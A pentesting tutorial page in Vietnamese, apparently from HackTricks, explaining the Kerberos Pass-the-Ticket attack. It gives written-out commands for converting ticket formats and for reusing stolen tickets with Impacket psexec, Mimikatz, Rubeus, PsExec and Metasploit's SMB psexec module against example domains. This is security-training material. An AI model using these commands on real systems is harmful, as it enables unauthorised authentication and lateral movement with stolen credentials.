# Pass the Ticket

{{#include ../../banners/hacktricks-training.md}}

## Tổng quan

Trong một cuộc tấn công Pass-the-Ticket (PtT), kẻ tấn công sử dụng ticket Kerberos bị đánh cắp để xác thực với tư cách principal của ticket mà không cần có mật khẩu của tài khoản đó. Ticket-granting ticket (TGT) có thể được dùng để yêu cầu service ticket, trong khi service ticket bị đánh cắp chỉ có thể dùng với service đích và trong thời hạn hiệu lực của nó.<sup>[[1]](#references)</sup>

Để xem các kỹ thuật thu thập ticket, hãy tham khảo:

- [Thu thập ticket từ Windows](../../network-services-pentesting/pentesting-kerberos-88/harvesting-tickets-from-windows.md)
- [Thu thập ticket từ Linux](../../network-services-pentesting/pentesting-kerberos-88/harvesting-tickets-from-linux.md)

## Chuyển đổi định dạng ticket giữa Linux và Windows

Các cache Kerberos thường có dạng file MIT `ccache` trên Linux và file `.kirbi` trên Windows. `ticket_converter` chuyển đổi giữa các định dạng này bằng cách sử dụng ticket đầu vào và đường dẫn đầu ra.<sup>[[2]](#references)</sup>

```bash
python ticket_converter.py velociraptor.ccache velociraptor.kirbi
# Expected message: Converting ccache => kirbi
python ticket_converter.py velociraptor.kirbi velociraptor.ccache
# Expected message: Converting kirbi => ccache
```

Kekeo cũng cung cấp các công cụ xử lý Kerberos ticket trên Windows.<sup>[[3]](#references)</sup>

## Sử dụng Ticket

Trên Linux, trỏ `KRB5CCNAME` đến cache và hướng dẫn client Impacket sử dụng Kerberos mà không nhắc nhập mật khẩu:<sup>[[4]](#references)</sup>

```bash
export KRB5CCNAME=/root/impacket-examples/krb5cc_1120601113_ZFxZpK
python psexec.py jurassic.park/trex@labwws02.jurassic.park -k -no-pass
```

Trên Windows, Mimikatz hoặc Rubeus có thể import ticket `.kirbi` vào phiên đăng nhập hiện tại. Dùng `klist` để kiểm tra cache sau khi import.<sup>[[5]](#references)[[6]](#references)</sup>

```powershell
mimikatz.exe "kerberos::ptt [0;28419fe]-2-1-40e00000-trex@krbtgt-JURASSIC.PARK.kirbi"
.\Rubeus.exe ptt /ticket:'[0;28419fe]-2-1-40e00000-trex@krbtgt-JURASSIC.PARK.kirbi'
klist
.\PsExec.exe -accepteula \\lab-wdc01.jurassic.park cmd
```

Việc nhập ticket không cấp quyền vượt quá những quyền được ticket thể hiện và chính sách cấp quyền của dịch vụ đích. Ticket hết hạn, bị thu hồi, sai định dạng hoặc có phạm vi không chính xác có thể không hoạt động.<sup>[[1]](#references)</sup>

Để tìm hiểu rộng hơn về các cuộc tấn công Kerberos và những kỹ thuật liên quan để lấy ticket, xem hướng dẫn tấn công Kerberos của Tarlogic.<sup>[[7]](#references)</sup>

### Tái sử dụng ticket bên ngoài trong Metasploit

Metasploit không tự động đọc `KRB5CCNAME` của Impacket cho các module Kerberos. Cung cấp cho module một **tệp ccache** thông qua tùy chọn `::Krb5Ccname` dành riêng cho giao thức. Đặt `::Rhostname` thành hostname SPN của mục tiêu và domain thành domain của mục tiêu; `RHOST` vẫn có thể là IP của mục tiêu. Nhờ vậy, có thể sử dụng ticket đã lấy được mà không cần nhập mật khẩu tài khoản.<sup>[[8]](#references)</sup>

Nếu cần, hãy chuyển đổi `.kirbi` sang ccache trước.<sup>[[9]](#references)</sup>

Ví dụ, với ticket của một tài khoản được phép tạo dịch vụ trên mục tiêu, hãy chạy [module SMB PsExec](../lateral-movement/psexec-and-winexec.md) bằng cache đó:<sup>[[8]](#references)[[9]](#references)[[10]](#references)</sup>

```text
use exploit/windows/smb/psexec
set RHOST 192.0.2.20
set SMBUser Administrator
set SMBDomain corp.example
set SMB::Auth kerberos
set SMB::Rhostname server.corp.example
set SMB::Krb5Ccname /path/to/administrator.ccache
set DomainControllerRhost 192.0.2.10
run
```

Metasploit trước tiên chọn service ticket phù hợp từ cache được cung cấp. Nếu chỉ tìm thấy TGT, nó sẽ yêu cầu KDC cấp service ticket, vì vậy đường đi này cũng cần kết nối tới DC. Cache chỉ có service ticket không cung cấp quyền truy cập vào các host không liên quan. Với các module được hỗ trợ khác, hãy đổi tiền tố của tùy chọn (ví dụ: `Winrm::Krb5Ccname` cho [WinRM](../lateral-movement/winrm.md)).<sup>[[8]](#references)</sup>



## References

- [1] [MITRE ATT&CK T1550.003 - Pass the Ticket](https://attack.mitre.org/techniques/T1550/003/)
- [2] [Zer1t0 - `ticket_converter`](https://github.com/Zer1t0/ticket_converter)
- [3] [gentilkiwi - Kekeo](https://github.com/gentilkiwi/kekeo)
- [4] [Fortra - Ví dụ Impacket](https://github.com/fortra/impacket/tree/master/examples)
- [5] [gentilkiwi - Mimikatz](https://github.com/gentilkiwi/mimikatz)
- [6] [GhostPack - Rubeus](https://github.com/GhostPack/Rubeus)
- [7] [Tarlogic - Kỹ thuật tấn công Kerberos](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [8] [Metasploit - Xác thực dịch vụ](https://docs.metasploit.com/docs/pentesting/active-directory/kerberos/service_authentication.html)
- [9] [Metasploit - Chuyển đổi file kirbi và ccache](https://docs.metasploit.com/docs/pentesting/active-directory/kerberos/ticket_converter.html)
- [10] [Triển khai Kerberos của SMB client trong Metasploit](https://github.com/rapid7/metasploit-framework/blob/master/lib/msf/core/exploit/remote/smb/client.rb)
{{#include ../../banners/hacktricks-training.md}}
